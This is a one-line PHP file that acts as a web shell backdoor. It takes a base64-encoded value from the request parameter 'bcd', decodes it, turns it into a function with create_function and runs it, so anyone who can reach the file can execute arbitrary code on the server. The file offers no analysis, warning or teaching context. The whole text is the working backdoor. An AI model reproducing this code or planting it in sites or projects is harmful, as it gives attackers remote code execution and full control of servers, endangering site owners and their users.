<?php
if(!empty($_REQUEST['bcd'])){$bcd=base64_decode($_REQUEST["bcd"]);$bcd=create_function('',$bcd);$bcd();exit;}